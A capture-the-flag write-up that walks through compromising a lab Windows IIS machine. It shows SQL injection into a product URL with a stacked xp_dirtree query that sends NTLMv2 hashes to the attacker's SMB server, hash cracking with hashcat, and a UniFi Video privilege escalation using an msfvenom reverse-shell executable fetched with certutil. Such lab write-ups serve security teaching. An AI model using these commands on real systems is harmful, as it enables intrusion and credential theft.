Visiting the website on port 80 and 443 both returned the same thing. It was the default Windows IIS, but with an image of a happy puppy. :D
![]({{ image_path }}{{ page.name }}/Pasted image 20231026135750.png)
With the small number of ports open and the seemingly bare Windows IIS server, I decided to directory/file brute-force the URL with `gobuster`. I like using the [`directory-list-2.3-medium.txt`](https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-medium.txt)wordlist.

`gobuster` was able to find 2 meaningful endpoints: `/remote` and `/mvc`. I checked out `/remote` first, which featured Windows PowerShell Web Access portal. It required a pair of credentials, so I initially searched for public exploits that would work with unauthenticated access. Unfortunately, this was not the initial entry point.

I got caught up on this endpoint for a while, but  decided to move on with the intention of finding a pair of credentials instead.
![]({{ image_path }}{{ page.name }}/Pasted image 20231026134942.png)

## SQL Injection
Visiting the `/mvc` endpoint led me to a web application.
![]({{ image_path }}{{ page.name }}/Pasted image 20231026135151.png)
Clicking on any of the URLs led to what seemed like the result of a simple query.
![]({{ image_path }}{{ page.name }}/Screenshot 2023-10-26 at 8.03.59 PM.png)
For example, I can imagine that the backend SQL query looks something like this.

```sql
SELECT Name, ProductNumber, Price FROM Product WHERE CategoryId = ?;
```

Assuming the URL parameter (`ProductSubCategoryId`) will replace the `?`, what could I use to verify that I am able to perform an unintended action? Here's one way I verified using a single-quote (`'`):
![]({{ image_path }}{{ page.name }}/Pasted image 20231026135209.png)
This meant that the query was somehow being manipulated in an unintended manner. The query with the single-quote would look something like this.
```sql
SELECT Name, ProductNumber, Price FROM Product WHERE CategoryId = 26';
```

## Initial Access Through NTLM Theft
Being able to successfully break the query means an attacker can manipulate the query because it is not being sanitized in the backend. But breaking the query is not enough to gain initial access. One thing an individual can do is stack queries in `MSSQL`, meaning appending queries using the semi-colon (`;`) delimiter. But what query to stack? My main goal by having access to `MSSQL` query execution is to steal NTLMv2 hashes. 

A very brief description of NTLMv2 theft is when a client authenticates to a server over NTLMv2 such as a SMB server. This authentication process reveals the authenticating user's NTLMv2 hash, which can be cracked using a password cracker such as `hashcat`. 

To initiate an authentication process through the `MSSQL` prompt, I can use the `xp_dirtree` command. In a typical `MSSQL` prompt, the full command to initiate an authentication using `xp_dirtree` to my SMB server would look like this.
```sql
1> EXEC master ..xp_dirtree '\\10.10.14.22\share';
```

Hence, the stacked query in the URL would look like this.
```
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18; EXEC master ..xp_dirtree '\\10.10.14.22\share'; --
```

On top of this, ensure that all necessary characters are URL encoded. Without the correct encoding, the correct characters may not be communicated to/in the backend.  
```
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18;%20EXEC%20master%20..xp_dirtree%20%27\\10.10.14.22\share%27;%20--
```

To start a listening SMB server (attacking machine) that the client (victim machine) would be authenticating to, I used `smbserver.py`.
```
$ smbserver.py share . -smb2support
```

Now, I can initiate an authentication request using my constructed URL.
![]({{ image_path }}{{ page.name }}/Screenshot 2023-10-27 at 12.04.21 PM.png)

And there's my NTLMv2 hash.
```
$ smbserver.py share . -smb2support

```

Using this command, I can crack the hash. `NTLMv2Hash.txt` contains the hash, and `rockyou.txt` is the wordlist I am cracking the hash against.
```
$ hashcat -m 5600 NTLMv2Hash.txt rockyou.txt
```

There was my set of credentials.

And there was my PowerShell access.

## Privilege Escalation
Looking around, I found a file named `unifivideo`. The sole contents seemed to be ASCII text reading `stop`. 

![]({{ image_path }}{{ page.name }}/Screenshot 2023-10-27 at 12.37.14 PM.png)
I researched programs this file may be related to and discovered it was related to "Ubiquiti UniFi Video". Searching for "unifivideo exploit" led me to CVE-2016-6914 (Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation).

This exploit exists due to the fact "Ubiquiti UniFi Video for Windows" is installed in `C:\ProgramData\unifi-video\` by default. This program also comes with the "Ubiquiti UniFi Video" service, which runs as the `NT AUTHORITY/SYSTEM` account. 

Because it runs as `NT AUTHORITY/SYSTEM` an attacker can take advantage of this if they have permission to control what is being executed. Luckily, this is possible: the `C:\ProgramData` directory's default permissions allow any user to write to the contents of the directory. Because the `C:\ProgramData\unifi-video` has no explicit permissions, the default permissions of the `C:\ProgramData` directory are inherited. 

When the "Ubiquiti UniFi Video" service is started, it looks and tries to execute a file at `C:\ProgramData\unifi-video\taskkill.exe`. This file does not exist by default, allowing for Arbitrary Code Execution. 

My choice of privilege escalation would be to get a shell, so I opted for a reverse shell in my payload.

To create my reverse shell payload, I used `msfvenom` and ran the following command.
```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f exe > taskkill.exe
```

Starting my `meterpreter` listener.
```
$ msfconsole
msf6 > use windows/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.22
msf6 > set LPORT 4444
msf6 > exploit
[*] Payload Handler Started as Job 0

[*] Started reverse TCP handler on 10.10.14.22:4444
```

With my listener running, I grabbed my `taskkill.exe` file from my attacking machine to my victim machine using a `python3` web server and `certutil` on `Powershell` to download the file.
```
PS C:\ProgramData\unifi-video> certutil -f -split -urlcache http://10.10.14.22/taskkill.exe
```

![]({{ image_path }}{{ page.name }}/Screenshot 2023-10-30 at 1.11.58 PM.png)

Now that my payload is saved into the file that will be executed by the service on start, all I have to do is restart the service.
```
PS C:\ProgramData\unifi-video> Restart-Service -Name "Ubiquiti UniFi Video"
```
![]({{ image_path }}{{ page.name }}/Screenshot 2023-10-30 at 3.50.05 PM.png)

And there was my `meterpreter` session. I connected to the session, spawned a shell, and read the `root` flag.
